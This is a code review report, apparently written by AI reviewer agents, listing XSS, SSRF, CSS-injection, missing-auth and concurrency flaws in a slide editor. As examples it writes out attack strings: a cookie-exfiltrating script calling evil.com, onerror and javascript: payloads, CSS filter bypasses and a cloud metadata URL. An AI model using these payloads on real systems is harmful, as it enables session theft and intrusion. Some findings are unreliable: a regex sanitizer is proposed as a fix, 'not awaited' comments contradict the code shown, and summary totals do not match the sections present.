# CODE REVIEW MASTER REPORT — NAVSLIDES EDITOR
**Date:** 2026-04-26
**Reviewers:** 7 parallel code-reviewer agents
**Scope:** ~100 source files, ~15,000 LOC across client/server/shared/electron/tests

---

## GRAND SUMMARY

| Group | Files | LOC | Critical | High | Medium | Low | Coverage Gaps |
|-------|-------|-----|----------|------|--------|-----|---------------|
| G1: Pages + Editor Core | 12 | ~7,000 | 3 | 6 | 11 | 7 | — |
| G2: UI + Properties | 52 | ~5,000 | 3 | 7 | 9 | 8 | — |
| G3: Stores + Hooks | 30+ | ~2,500 | 4 | 5 | 5 | 5 | — |
| G4: Export/Import | 18 | ~1,800 | 1 | 3 | 7 | 2 | — |
| G5: Server | 1 huge | ~2,500 | 6 | 5 | 5 | 6 | — |
| G6: Shared + Electron | 18 | ~2,000 | 2 | 3 | 8 | 4 | — |
| G7: E2E + Unit Tests | 28+ | ~4,000 | 10 | 9 | 20 | — | 20 |
| **TOTAL** | **~160** | **~24,800** | **29** | **38** | **65** | **32** | **20** |

**Total issues: 164+**

---

## ============================================================
## GROUP 1: PAGES + EDITOR CORE COMPONENTS
**Files:** EditorPage.jsx, HomePage.jsx, ExplorePage.jsx, SettingsPage.jsx, LiveViewPage.jsx, RemoteControlPage.jsx, SpeakerViewPage.jsx, SlideCanvas.jsx, Toolbar.jsx, InsertMenu.jsx, FindReplaceBar.jsx, MiniToolbar.jsx

### CRITICAL

#### 1. XSS — SVG content rendered without sanitization
**File:** `client/src/components/SlideCanvas.jsx:2653-2673`
```js
function SvgElementRenderer({ element }) {
  const content = element.content || ''
  let modifiedContent = content
  if (element.fillOverride) {
    modifiedContent = modifiedContent.replace(/fill="[^"]*"/g, `fill="${element.fillOverride}"`)
  }
  return <div style={svgElementStyle} dangerouslySetInnerHTML={{ __html: modifiedContent }} />
}
```
User-controlled SVG content rendered via `dangerouslySetInnerHTML`. Regex only strips `fill`/`stroke` attributes — does NOT remove `onload`, `onerror`, `<script>`, `<foreignObject>`.
**Impact:** Author can embed `<svg><script>fetch('https://evil.com?c='+document.cookie)</script></svg>` and exfiltrate session data.
**Fix:** Use `DOMPurify.sanitize()` on `modifiedContent`.

#### 2. XSS — Markdown HTML output without sanitization
**File:** `client/src/components/SlideCanvas.jsx:2007-2072`
Custom markdown parser output passed to `dangerouslySetInnerHTML` without sanitization. Malformed HTML like `</p><img src=x onerror=alert(1)>` bypasses parser and renders as-is.
**Impact:** Low in editor (author controls own content), but exported presentations served to viewers would execute scripts.
**Fix:** Wrap with `DOMPurify.sanitize()` before rendering.

#### 3. Missing API response validation — live room creation
**Files:** `client/src/components/EditorPage.jsx:1033`, `client/src/pages/LiveViewPage.jsx:67`
```js
const res = await fetch('/api/live/room', { method: 'POST' })
const data = await res.json()
setLiveRoomCode(data.roomCode)  // no check: res.ok? does roomCode exist?
```
Server errors cause silent failures. Non-JSON responses cause `.json()` rejection.
**Fix:** Add `if (!res.ok) throw new Error(\`HTTP ${res.status}\`)`.

### HIGH

#### 4. Stale closure — handleRedo captures stale presentation
**File:** `client/src/components/EditorPage.jsx:743-756`
```js
const handleRedo = useCallback(() => {
  if (presentation)
    historyRef.current = [
      ...historyRef.current.slice(-49),
      JSON.parse(JSON.stringify(presentation)),  // stale from closure
    ]
  setPresentation(redoState)
}, [presentation, setPresentation, setCurrentSlideIndex])
```
If user triggers redo while presentation state is mid-update (e.g., during async auto-save), the wrong state may be pushed to history.
**Fix:** Use a ref for current presentation: `const presentationRef = useRef(presentation)`.

#### 5. Stale closure — handleUndo deps mismatch
**File:** `client/src/components/EditorPage.jsx:731-741`
`handleUndo` has no deps `[]` but reads `historyRef.current`, `redoStackRef.current`, `applyingUndoRef` — all refs, so safe. Document intent.

#### 6. Missing null check — settings state in updateAI
**File:** `client/src/pages/SettingsPage.jsx:97-98`
```js
const updateAI = (key, val) => setSettings((s) => ({ ...s, ai: { ...s.ai, [key]: val } }))
```
Before settings load, `settings` is `null`. `updateAI` throws: `Cannot read properties of null (reading 'ai')`.
**Fix:** `setSettings((s) => s ? ({ ...s, ai: { ...s.ai, [key]: val } }) : s)`.

#### 7. Socket event trusted without schema validation
**File:** `client/src/pages/LiveViewPage.jsx:62`
`'presentation-data'` socket event trusted without schema validation. Malformed server data could set arbitrary HTML.
**Fix:** Validate `data` shape before setting state.

#### 8. handleTestConnection race condition
**File:** `client/src/pages/SettingsPage.jsx:83-95`
`handleSave()` sets state, then `testAIConnection()` runs. Race between save state update and test call. AI config may be stale.
**Fix:** Extract save logic into shared async function that returns saved settings.

#### 9. onMouseMove re-creates listener when callback identity changes
**File:** `client/src/components/SlideCanvas.jsx:315-502`
`onUpdateElement`/`onUpdateElements` in deps means listener is removed/re-added on every callback recreation. Janky drag operations.
**Fix:** Use a ref to hold latest callbacks.

#### 10. Stale presentation closure in handleUndo
**File:** `client/src/components/EditorPage.jsx:743`
Same pattern as handleRedo — stale `presentation` from closure.

#### 11. Settings null throws before load
**File:** `client/src/pages/SettingsPage.jsx:98`
Same as #6 — `updateAI` throws when settings is null.

#### 12. onMouseMove effect re-creates listener
**File:** `client/src/components/SlideCanvas.jsx:315`
Same as #9 — janky drag.

### MEDIUM

#### 13. Dead module-level refs in HomePage
**File:** `client/src/pages/HomePage.jsx:208-211`
```js
let pdfInputRef = null
let mdInputRef = null
```
Both unused. Remove entirely.

#### 14. Dead hasChanges variable in EditorPage
**File:** `client/src/components/EditorPage.jsx:888`
```js
const hasChanges = historyRef.current.length > 1  // computed every render, never read
```
Passed to QuickAccessToolbar but likely unused there too.

#### 15. Inline IIFE for modal rendering
**File:** `client/src/components/EditorPage.jsx:1367-1382`
```js
{showAICopywriter && (() => { ... })()}
```
Runs on every render even when closed. Extract to named sub-component.

#### 16. Unnecessary presentation dependency in editor callbacks
**File:** `client/src/components/EditorPage.jsx:518,543,568`
`openHtmlEditor`, `openCodeEditor`, `openLatexEditor` have `presentation` in deps but read from `presentationRef` internally. Removing `presentation` from deps prevents unnecessary re-creation.

#### 17. Settings state used without loading guard
**File:** `client/src/pages/SettingsPage.jsx:97-98`
Same as #6.

#### 18. chartData.datasets injected into iframe script
**File:** `client/src/components/SlideCanvas.jsx:2080-2109`
```js
datasets:${JSON.stringify(datasets)}
```
User data injected via JSON.stringify into `<script>` tag. Low risk but worth noting.

#### 19. confirmDialog.onConfirm() called before state clear
**File:** `client/src/pages/HomePage.jsx:1581-1584`
Handler called before `setConfirmDialog(null)`. If handler throws, state is cleared without feedback.

#### 20. showAICopywriter modal reads selectedElementId from outer scope
**File:** `client/src/components/EditorPage.jsx:1369`
Should use `selectedElement` already computed at line 817.

#### 21. marketplaceSearch not memoized
**File:** `client/src/pages/HomePage.jsx:1130-1143`
Filters on every keystroke without memoization.

#### 22. elapsedTime timer continues after room leave
**File:** `client/src/pages/RemoteControlPage.jsx:45-48`
Timer cleared on unmount but not on room leave. Multiple timers possible on navigation.

#### 23. SvgElementRenderer regex could corrupt SVG on quote in fill value
**File:** `client/src/components/SlideCanvas.jsx:2657-2664`
If `fillOverride` contains `"`, breaks attribute syntax.

#### 24. Missing editingElementId dep in callbacks
**File:** `client/src/components/EditorPage.jsx`
Callbacks reference `editingElementId` but it may be stale between renders.

### LOW

#### 25. Duplicate THEMES/TRANSITIONS across 3 files
**Files:** EditorPage.jsx:90-104, SettingsPage.jsx:16-29, HomePage.jsx:36-49
Move to shared/ and import.

#### 26. saving state always false
**File:** `client/src/components/EditorPage.jsx:139`
`setSaving` called but `saving` never read.

#### 27. showMasterPanel declared but never read
**File:** `client/src/components/EditorPage.jsx:187`
Setter never called, variable never read. Dead code.

---

## ============================================================
## GROUP 2: UI COMPONENTS + PROPERTIES PANELS
**Files:** 52 files — UI primitives, modals, dashboard, properties panels

### CRITICAL

#### 1. XSS — TransitionPreview el.content in srcDoc
**File:** `client/src/components/TransitionPreview.jsx:30`
```js
if (el.type === 'text')
  return `<div style="${style}padding:8px 12px;color:white;">${el.content || ''}</div>`
```
`el.content` HTML string interpolated into srcDoc iframe. Script tags execute.
**Fix:** Strip scripts before rendering:
```js
const stripHtml = (html) => html
  .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
  .replace(/\son\w+="[^"]*"/gi, '')
  .replace(/javascript:/gi, '')
```

#### 2. XSS — SlidePanel text content via dangerouslySetInnerHTML
**File:** `client/src/components/SlidePanel.jsx:248`
```jsx
dangerouslySetInnerHTML={{ __html: el.content || '' }}
```
Stored XSS — any presentation with malicious slide text executes code.
**Fix:** Use DOMPurify.

#### 3. XSS — SlideSorterView srcDoc with allow-scripts
**File:** `client/src/components/SlideSorterView.jsx:263`
```jsx
<iframe srcDoc={el.content} sandbox="allow-scripts" />
```
allow-scripts explicitly permits injected script execution.

### HIGH

#### 4. NaN propagation — Number(e.target.value) on empty input
**Files:** `common-element-controls.jsx:25,34,44,54,63`, `shape-properties.jsx`, `table-properties.jsx`, `code-properties.jsx`, `media-properties.jsx`, `misc-properties.jsx`
```jsx
value={Math.round(element.x)}
onChange={(e) => onUpdate({ x: Number(e.target.value) })}
```
`Number('')` returns `NaN`. Stored silently and persists.
**Fix:**
```jsx
onChange={(e) => {
  const v = Number(e.target.value)
  if (!isNaN(v)) onUpdate({ x: v })
}}
```

#### 5. Unvalidated id prop in URL
**File:** `client/src/components/SlideThumbnail.jsx:28`
```jsx
src={`/api/presentations/${id}/present?preview=true`}
```
If `id` is undefined, URL becomes `/api/presentations/undefined/present?preview=true`.

#### 6. ResizeObserver memory leak
**File:** `client/src/components/SlideThumbnail.jsx:10-17`
```jsx
const observer = new ResizeObserver((entries) => { ... })
observer.observe(containerRef.current)
return () => observer.disconnect()
```
Observer created without cleanup on re-init. Multiple observers accumulate.
**Fix:** Store in ref, disconnect on cleanup.

#### 7. Missing null-safety in DropdownMenu items.map
**File:** `client/src/components/DropdownMenu.jsx:43`
```jsx
{items.map((item, idx) => {
  if (item.type === 'separator') { ... }
```
No null guard. Crash if items contains null.

#### 8. Silent fetch errors
**Files:** `AnalyticsModal.jsx:16`, `SyncModal.jsx:22`, `MediaLibraryModal.jsx:47-49`
```jsx
.catch(() => setLoading(false))
```
Network errors silently swallowed. User sees "No data" with no actionable feedback.

#### 9. DOMParser per render
**File:** `client/src/components/AnimationTimeline.jsx:35`
```js
const doc = new DOMParser().parseFromString(el.content || '', 'text/html')
```
Allocated on every render for every text element.
**Fix:** Memoize with useCallback or replace with regex.

#### 10. Missing handleContextMenu useCallback optimization
**File:** `client/src/components/SlidePanel.jsx:151`
Recreated on every render, causing child re-renders.

### MEDIUM

#### 11. Canvas allocation per parseColorToHex call
**File:** `client/src/components/ui/ColorPicker.jsx:31`
Canvas created on every call for named colors.

#### 12. CSS injection risk in PropertiesPanel
**File:** `client/src/components/PropertiesPanel.jsx:226`
User-provided CSS injected without sanitization.

#### 13. Missing URL validation on media fields
**Files:** `media-properties.jsx`, `image-properties.jsx`
`element.src`, `element.poster` accept arbitrary strings.

#### 14. window.confirm dialogs
**Files:** `HistoryModal.jsx:49`, `MediaLibraryModal.jsx:82`, `ShareModal.jsx:63`
Blocking dialogs disrupt UX, cannot be styled.

#### 15. Missing aria-label on SlideSorterView context menu
**File:** `client/src/components/SlideSorterView.jsx:190-208`
Inaccessible to screen readers.

#### 16. Empty string sort inconsistency
**File:** `client/src/components/dashboard/TemplateGallery.jsx:201`
```js
return b.id > a.id ? 1 : -1  // returns -1 instead of 0 for equal IDs
```

#### 17. localStorage without try-catch
**File:** `client/src/components/dashboard/TemplateGallery.jsx:131`
Throws in private browsing (Firefox), embedded iframes, quota exceeded.

#### 18. Hardcoded preview dimensions 960x540
**File:** `client/src/components/TransitionPreview.jsx:57-58`
Ignores `presentation.resolution`. Preview always 16:9.

### LOW

#### 19. Non-existent btn btn-secondary CSS classes
**File:** `client/src/components/properties/misc-properties.jsx:13,28,281`
Old Bootstrap-style classes. Falls back to unstyled native button.

#### 20. Emoji for accessibility
**Files:** `SelectionPane.jsx:77`, `CommonElementControls.jsx:77`
`🔒` / `🔓` announced by screen readers.

#### 21. key on non-list element
**File:** `client/src/components/dashboard/TemplateGallery.jsx:307`
Misleading — key only meaningful on .map() results.

#### 22. Magic number 0.22 for thumbnail scale
**File:** `client/src/components/dashboard/TemplatePreview.jsx:268`
Breaks if container changes size.

#### 23. No debounce on auto-slide input
**File:** `client/src/components/PropertiesPanel.jsx:166`
Every keystroke fires autosave.

#### 24. Inconsistent icon strategy (SVG vs emoji)
**Files:** Throughout codebase

#### 25. Duplicate Button import
**File:** `client/src/components/properties/table-properties.jsx:2`
Button imported twice.

#### 26. Unused pendingAction guard
**File:** `client/src/components/HistoryModal.jsx:157`
Restore/delete disabled when ANY pending action active.

---

## ============================================================
## GROUP 3: STORES + HOOKS + UTILS
**Files:** 30+ files — Zustand stores, hooks, utilities, data, lib, extensions, services

### CRITICAL

#### 1. Race condition — useHistory stale closure
**File:** `client/src/hooks/use-history.js:26-34`
```js
const timer = setTimeout(() => {
  if (presentation) {
    historyRef.current = [...historyRef.current.slice(-50), JSON.parse(JSON.stringify(presentation))]
  }
}, DEBOUNCE_MS)
```
`presentation` captured at timer-creation time. Every state change queues a timer that snapshots the state at THAT moment. History is always ONE STEP BEHIND. If user makes one change and hits Undo immediately (within debounce window), undo fails silently.
**Impact:** Data loss on undo — especially problematic for `deleteSelectedElements` where deletion + selection clear happen in a non-atomic pair of calls.
**Fix:** Use `get()` from zustand inside the timer, or use a ref for the latest state.

#### 2. Stale closure — use-live-presentation socket race
**File:** `client/src/hooks/use-live-presentation.js:14-26`
```js
const setupSocket = async () => {
  let currentCode = code  // stale capture
  if (role === 'presenter' && !currentCode) {
    const res = await fetch('/api/live/room', { method: 'POST' })
    const data = await res.json()
    currentCode = data.roomCode  // may not match state
    setCode(currentCode)
  }
```
Async function defined inside effect captures `code` from closure. If `code` state changes between effect run and API call, socket connects to stale room code.
Also: `navigate` function reads `isConnected` from React state — stale between event and socket event firing.
**Fix:** Use a ref for `currentCode` and update synchronously before async calls.

#### 3. Memory leak — use-reveal-preview-frame interval
**File:** `client/src/hooks/use-reveal-preview-frame.js:27-61`
```js
setTimeout(() => {
  if (revealCheckRef.current) {
    clearInterval(revealCheckRef.current)
    revealCheckRef.current = null
  }
}, 15000)
```
Timeout clears interval but onload also tries to. Hardcoded 15s timeout — if onload never fires, interval continues running. Second useEffect (deps: `[state]`) does NOT clear interval — if it fires while interval is active, interval continues and `deckRef` may be overwritten.
**Fix:** Centralize interval cleanup in single cleanup function.

#### 4. Fragile setTimeout in use-clipboard
**File:** `client/src/hooks/use-clipboard.js:59-70`
```js
setTimeout(() => {
  elementsToDuplicate.forEach((el) => {
    const newId = crypto.randomUUID()
    addElement({ ...el, id: newId, x: (el.x||0)+20, y: (el.y||0)+20 })
  })
}, 50)
```
Arbitrary 50ms delay with no React lifecycle guarantee. Rapid operations may execute out of order.
**Fix:** Write directly to store synchronously — clipboard store doesn't need to settle before elements are added.

### HIGH

#### 5. No error handlers on Socket.IO events
**File:** `client/src/hooks/use-live-presentation.js:32-48`
Socket emits fail silently. `navigate` does nothing on failure.

#### 6. Missing null guard in addSlide
**File:** `client/src/hooks/use-slide-operations.js:246`
```js
setCurrentSlideIndex(presentation.slides.length)  // NPE if presentation null
```
Function doesn't guard against null `presentation`.

#### 7. API module missing input validation
**File:** `client/src/utils/api.js:4-7`
```js
async function handleResponse(r) {
  const body = await r.json().catch(() => ({ error: `HTTP ${r.status}` }))
```
No validation that IDs are non-empty strings. Passing `null` creates `/api/presentations/null`. No response schema validation — `handleResponse` silently returns `{error: "HTTP 204"}` for empty responses.

#### 8. useKeyboard memo deps include unstable callback refs
**File:** `client/src/hooks/use-keyboard.js:127-139`
```js
], [
  isEditing,
  onCopy,    // typically new fn every render
  onCut,     // typically new fn every render
  ...
])
```
`handleKeyDown` recreated on nearly every render. Effect constantly re-attaches/detaches listeners.

#### 9. Clipboard state not cleared on copy fail
**File:** `client/src/stores/editor-store.js:24-28`
`copySelected`/`cutSelected` write to clipboard regardless of whether elements were found.

### MEDIUM

#### 10. Excessive re-renders in use-autosave
**File:** `client/src/hooks/use-autosave.js:40`
Presentation object reference changes on every element update — effect re-runs on every keystroke.

#### 11. XSS vector in element-defaults HTML D3 content
**File:** `client/src/data/element-defaults.js:57-67`
D3 HTML element default contains unsanitized inline JS with template literals. If rendered without sanitization (HTML export, preview), potential XSS.
```js
const W = window.innerWidth, H = window.innerHeight;
const svg = d3.select('#viz').attr('viewBox', `0 0 ${W} ${H}`);
const data = Array.from({length: 30}, () => ({ x: Math.random()*W, y: Math.random()*H, r: 8+Math.random()*20 }));
```

#### 12. No cleanup on dependency change in use-live-presentation
**File:** `client/src/hooks/use-live-presentation.js:59`
Old socket stays connected when `presentationId` or `role` changes. Cleanup only on unmount.

#### 13. Shared store mutations possible under concurrent operations
**File:** `client/src/stores/editor-store.js` + `presentation-store.js`
Store actions read via `get()`. If `presentation` changes between caller's read and store's read, operation targets wrong slide.

#### 14. FontFamily CSS injection
**File:** `client/src/extensions/FontFamily.js:16-17`
```js
renderHTML: (attrs) =>
  attrs.fontFamily ? { style: `font-family: ${attrs.fontFamily}` } : {},
```
Font names inserted without sanitization. Malicious names like `"bold" sans-serif;"` can break out of attribute.

### LOW

#### 15. SNAP_THRESHOLD magic number
**File:** `client/src/hooks/slide-operation-helpers.js:1`
`SNAP_THRESHOLD = 6` defined inline rather than imported from `slide-constants.js`.

#### 16. MAX_UNDO_STEPS duplicated
**File:** `client/src/hooks/use-history.js:29`
Magic number `slice(-50)` duplicated across two places.

#### 17. Unused catch parameter
**File:** `client/src/extensions/MathExtension.js:52`
```js
} catch (e) {  // 'e' caught but unused
```

#### 18. generateHTML.js re-exports
**File:** `client/src/utils/generateHTML.js`
If `shared.default` exists, destructuring `{ generateRevealHTML, ... }` picks wrong module.

---

## ============================================================
## GROUP 4: EXPORT + IMPORT PIPELINE
**Files:** 18 production + 8 test files

### CRITICAL

#### 1. Async fire-and-forget in fallback error path
**File:** `client/src/utils/export-pptx-renderers.js:61,65`
```js
default:
  await addFallbackElement(slide, element, bounds, warnings, slideNumber)  // NOT awaited!
  break
} catch (error) {
  warnings.push(...)
  await addFallbackElement(slide, element, bounds, warnings, slideNumber)  // NOT awaited!
}
```
`addFallbackElement` is async but called without await. Fallback may not complete before `writeFile`. Warnings may be pushed after write resolves. HTML/latex raster call is fire-and-forget.
**Fix:** `await` the calls or restructure to not mix async fallbacks.

### HIGH

#### 2. Unbounded cache growth across exports
**File:** `client/src/utils/export-pptx-raster.js:13-14`
```js
const assetTextCache = new Map()
const assetDataUriCache = new Map()
```
Module-level caches accumulate indefinitely across multiple exports. No clear(), no size limit. Memory grows unbounded.

#### 3. fetchCache never cleared between offlineExport calls
**File:** `client/src/utils/offlineExport.js:36`
```js
const fetchCache = new Map()  // cleared only at end of generateOfflineHTML
```
If called multiple times in session, cache accumulates across calls.

#### 4. PDF page upload failures silently ignored
**File:** `client/src/utils/pdf-import.js:44-67`
```js
} catch (err) {
  console.error(`Failed to upload PDF page ${i}:`, err)
}
// No user feedback, no partial result, no retry
```

### MEDIUM

#### 5. Markdown import has no HTML sanitization on link hrefs
**File:** `client/src/utils/markdown-import.js:101-104`
```js
html = html.replace(
  /\[([^\]]+)\]\(([^)]+)\)/g,
  '<a href="$2" style="color:#818cf8;text-decoration:underline;">$1</a>'
)
```
URL inserted directly into href without validation. `javascript:alert(1)` passes through.

#### 6. pdf-import.js loads worker from CDN at runtime
**File:** `client/src/utils/pdf-import.js:12-13`
```js
pdfjsLib.GlobalWorkerOptions.workerSrc =
  `https://cdnjs.cloudflare.com/ajax/libs/pdf.js/${pdfjsLib.version}/pdf.worker.min.mjs`
```
CDN worker fetched at runtime — supply chain gap if CDN is compromised.

#### 7. rehydrateImportedPresentation silently swallows media upload failures
**File:** `client/src/utils/import-project.js:88-96`
Failed uploads continue with invalid original URLs still referenced.

#### 8. buildHtmlCaptureSrcdoc injects script before doctype
**File:** `client/src/utils/export-pptx-raster-capture.js:137-146`
Fallback `${scriptTag}${source}` prepends script BEFORE `<!doctype>`, creating invalid HTML.

#### 9. getNativeChartDefinition returns undefined for unknown types
**File:** `client/src/utils/export-pptx-core.js:148-149`
Unknown chart types passed as `undefined` to pptxgenjs. Error caught but confusing.

#### 10. parseTag regex misses void elements without slash
**File:** `client/src/utils/export-pptx-html-parser.js:33`
`<br>`, `<hr>`, `<img>` without trailing `/` are not marked self-closing.

### LOW

#### 11. doctype-before-script injection bug
**File:** `client/src/utils/export-pptx-raster-capture.js`
Same as #8.

#### 12. roundCoord floating point accumulation
**File:** `client/src/utils/export-pptx-core.js:7-9`
`toFixed` returns string, `Number()` reconverts. Acceptable for UI-to-PPTX but worth noting.

---

## ============================================================
## GROUP 5: SERVER (Express + Socket.IO)
**Files:** server/index.js, server/routes/, server/services/, server/middleware/

### CRITICAL

#### 1. Share token cascade delete completely broken
**File:** `server/index.js` (DELETE /api/presentations/:id/permanent)
```js
for (const [token, id] of Object.entries(tokens)) {
  if (id === presId) {   // id is always a STRING key, not the value
    delete tokens[token]
```
Since share tokens were normalized to objects, `id` is always the token key string, never the `presentationId` value. `id === presId` is always false. All share tokens orphaned on permanent delete. Password-protected shares leak.
**Fix:** Compare `sanitized.presentationId` not the string key.

#### 2. View counter race condition — read outside file lock
**File:** `server/index.js:239-241`
```js
tokenData.views = (tokenData.views || 0) + 1
tokens[req.params.token] = tokenData
await writeShareTokens(tokens)
```
`readShareTokens` called OUTSIDE the lock. Under concurrent requests, second writer overwrites first's increment.
**Fix:** Move read inside the lock.

#### 3. Analytics endpoint exposes view data publicly
**File:** `server/routes/analytics.js:45`
`GET /api/analytics/:id` returns total views, daily counts, per-token breakdown, last 20 view events with timestamps. No auth. Any client who knows presentation ID gets private business data.
**Fix:** Require share token validation or add auth.

#### 4. Live room presenter auth missing — anyone can hijack any room
**File:** `server/services/live-rooms.js:33-42`
```js
if (role === 'presenter') {
  if (!room) room = createRoom(socketId)
  else room.presenterId = socketId
```
No token, password, or verification. Attacker with room code (6-char alphanumeric, ~2.2B combinations, trivially brute-forced in seconds) can hijack any live presentation.
**Fix:** Add room password or token verification.

#### 5. SSRF in AI custom endpoint
**File:** `server/services/ai-provider.js:65-92`
```js
const response = await fetch(url, {
```
No validation that `config.customEndpoint` resolves to allowed host. `http://169.254.169.254/latest/meta-data/` (AWS metadata) accessible if server is internet-facing. Direct path to infrastructure compromise.
**Fix:** Validate hostname/IP is not internal.

#### 6. CSS regex filter trivially bypassed
**File:** `server/index.js:163-169`
```js
sanitized.customCSS = sanitized.customCSS
  .replace(/expression\s*\(/gi, '/* blocked */(')
  .replace(/javascript\s*:/gi, '/* blocked */:')
  .replace(/url\s*\(\s*['"]?\s*javascript/gi, 'url(/* blocked */')
```
Regex CSS filtering bypasses: `e\xpression(`, `j\navascript:`, `url(j\x61vascript:`, `style="behavior: url('#default#time2')"`, `@import`, `calc()` side effects, etc.
**Fix:** Replace with proper CSS sanitizer (CSSesc or strict allowlist).

### HIGH

#### 7. AI JSON parsing without schema validation
**File:** `server/routes/ai.js:94`
```js
const outline = JSON.parse(cleanedJsonPattern)
```
No Zod/schema validation. Malformed AI response throws uncaught exception → 500 error.

#### 8. AI error messages exposed to client
**File:** `server/routes/ai.js:56`
```js
res.status(500).json({ error: err.message })
```
Full error from OpenAI/Gemini/custom API sent directly to client. Could expose internal URLs, API key prefixes, config.

#### 9. Socket.IO CORS allows any origin in production
**File:** `server/index.js:308`
```js
const corsOptions = process.env.NODE_ENV === 'production' ? { origin: false } : { origin: '*' }
const io = new Server(server, { cors: corsOptions, path: '/ws' })
```
REST API uses `origin: false`, Socket.IO uses `origin: '*'` in production. Mismatch defeats same-origin policy for WebSocket.

#### 10. recordView and saveMediaDb write without withFileLock
**File:** `server/routes/analytics.js:25-42`, `server/routes/media.js:21-22`
Bare `fs.writeFileSync`/`fs.writeJson` without locking. Concurrent writes cause partial writes → data loss/corruption.

#### 11. Explore endpoint returns trashed presentations
**File:** `server/routes/explore.js:29-30`
```js
const publicDecks = presentations
  .filter((p) => uniqueIds.includes(p.id))
```
No `.filter((p) => !p.deletedAt)`. Trashed presentations with active share links appear in public feed.

### MEDIUM

#### 12. PPTX temp file cleanup after response sent
**File:** `server/routes/pptx-import.js:51`
`finally` block executes AFTER `res.json(result)`. If unlink hangs, temp files accumulate.

#### 13. isValidId not applied to share token routes
**File:** `server/index.js:50-65`
Share token endpoints accept any string. Malformed/long tokens not rejected at routing layer.

#### 14. bcrypt fallback stores plaintext passwords
**File:** `server/routes/sync.js:60-65`
```js
try {
  obscuredPassword = await runRclone(['obscure', password])
} catch {
  obscuredPassword = password  // plaintext!
```
If rclone obscure fails, passwords stored in plaintext in rclone.conf.

#### 15. Race condition in permanent delete cascade
**File:** `server/routes/presentations.js:261-295`
Share token cascade uses separate read/write calls OUTSIDE the presentations lock. Concurrent deletes can interleave.

#### 16. No rate limit on analytics read
**File:** `server/routes/analytics.js:45`
Only global `/api/` limiter applies (300 req/15min). Attacker can enumerate presentation IDs cheaply.

#### 17. Room codes use Math.random (not cryptographically secure)
**File:** `server/services/live-rooms.js:17-23`
Combined with no presenter auth, hijacking is feasible.

### LOW

#### 18. DOMPurify only on type === 'html' elements
**File:** `server/index.js:155`
Other element types with HTML-like content not sanitized. generateRevealHTML output served without re-sanitization.

#### 19. Explore fork doesn't check token expiry
**File:** `server/routes/explore.js:45-82`
Expired tokens can still fork presentations.

#### 20. normalizePresentationNotes output not validated
**File:** `server/routes/presentations.js:210-215`
Malformed `req.body` written directly after normalization.

#### 21. Explore loads all presentations into memory
**File:** `server/routes/explore.js:18`
No pagination or filtering at storage layer.

#### 22. No try/catch on socket.to().emit()
**File:** `server/services/socket-handler.js:122-123`
If socket disconnects between success check and emit, viewers miss navigation updates.

---

## ============================================================
## GROUP 6: SHARED PACKAGE + ELECTRON
**Files:** shared/src/*, electron/*

### CRITICAL

#### 1. Missing iframe sandbox attributes
**File:** `shared/src/element-renderers.js:124,133,183,229,354`
All iframes (HTML/Markdown/Chart/LaTeX/QR) lack `sandbox` attribute. iframe CAN navigate (`top.location`), submit forms, open popups.
```js
// Current — no sandbox
`<iframe${wrap} srcdoc="${escapeSrcdoc(wrappedContent)}" ...>`

// Should be
`<iframe${wrap} sandbox="allow-same-origin" srcdoc="${escapeSrcdoc(wrappedContent)}" ...>`
```

#### 2. LaTeX content closes script tag in srcdoc iframe
**File:** `shared/src/element-renderers.js:228`
```js
const bodyContent = hasTikz
  ? `<script type="text/tikz">${content}</script>`
  : `<div id="m"></div><script>try{katex.render(${JSON.stringify(content)},document.getElementById('m'),...)}catch(e){...}</script>`
```
If `content` contains `</script>`, it closes the script tag prematurely. Example: `\x3cscript\x3ealert(1)\x3c/script\x3e` injects arbitrary HTML.
**Fix:** Escape `</script>` in content.

### HIGH

#### 3. customCSS injection — incomplete server sanitization + no client-side
**File:** `shared/src/htmlGenerator.js:170,464`
```js
`${presentation.customCSS ? `\n  <style>\n${presentation.customCSS}\n  </style>` : ''}`
```
Server-side sanitization misses `@import`, `data:` URLs, CSS selector exfiltration. Client-side export paths (downloadHTML, exportPDF, presentInWindow, AnimationPreviewModal, export-project.js) bypass server sanitization entirely.

#### 4. Electron sandbox disabled globally
**File:** `electron/main.js:2,8`
```js
process.env.ELECTRON_DISABLE_SANDBOX = '1'
app.commandLine.appendSwitch('no-sandbox')
```
Both env var and CLI switch disable Chromium sandbox. Renderer process exploits have fewer protections.
**Fix:** Remove global disable. Use per-user or CI-only flag if needed.

#### 5. KaTeX content in HTML attribute
**File:** `shared/src/element-renderers.js:215`
```js
`<span data-math-latex="${escapeHtml(content)}" ...>`
```
Defense-in-depth concern. If `escapeHtml` is removed/bypassed, LaTeX in attribute can be extracted and re-rendered.

### MEDIUM

#### 6. Print LaTeX iframe srcdoc missing escapeSrcdoc
**File:** `shared/src/element-renderers.js:212`
Same issue as #2 but for print-path TikZ iframe.

#### 7. getBackgroundAttrs: null export — confusing circular dep
**File:** `shared/src/element-renderers.js:425`
```js
getBackgroundAttrs: null, // will be set from htmlGenerator
```
Overwritten in htmlGenerator.js via direct require. Confusing.

#### 8. TEXT_COLORS/BG_COLORS duplicated with different values
**Files:** shared/src/index.js:12-39 vs shared-toolbar-*-config.js
`index.js` has cyan colors (#67e8f9 etc.) that toolbar config doesn't have. Toolbar config has 6 gradients vs 10 in index. Inconsistent palettes.

#### 9. No DOMPurify in client-side HTML rendering
**File:** `shared/src/element-renderers.js:110`
```js
const content = el.content || ''
const wrappedContent = `<!doctype...><body>${content}</body></html>`
```
Offline exports, PDF exports, preview modes are unprotected.

#### 10. Markdown print mode renders raw text
**File:** `shared/src/element-renderers.js:129`
```js
return `<div...>${el.content || ''}</div>`
```
Print-mode markdown renders source as plain text instead of parsing.

#### 11. Shape text content unescaped in SVG
**File:** `shared/src/shapeUtils.js:102`
```js
textEl = `<text...>${el.text}</text>`
```
HTML tags in shape text would render as elements.

### LOW

#### 12. NaN in SVG when dimensions undefined
**File:** `shared/src/shapeUtils.js:20-21,32,43,63,102`
`undefined` arithmetic produces `NaN` in SVG attributes.

#### 13. Icon path data from JSON not validated
**File:** `shared/src/element-renderers.js:193-202`
If icon-paths.json is compromised, arbitrary SVG content could be injected.

#### 14. TypeDef 'qr' vs RENDERER 'qrcode' mismatch
**File:** `shared/src/types/presentation.js:14`
`'qr'` in typedef but `'qrcode'` in RENDERERS. `'divider'` has no RENDERER.

#### 15. generatePrintHTML not re-exported to client
**File:** `client/src/utils/generateHTML.js`
Exists in shared but not forwarded to client.

#### 16. No client-side export path tests
**File:** `shared/tests/htmlGenerator.test.js`
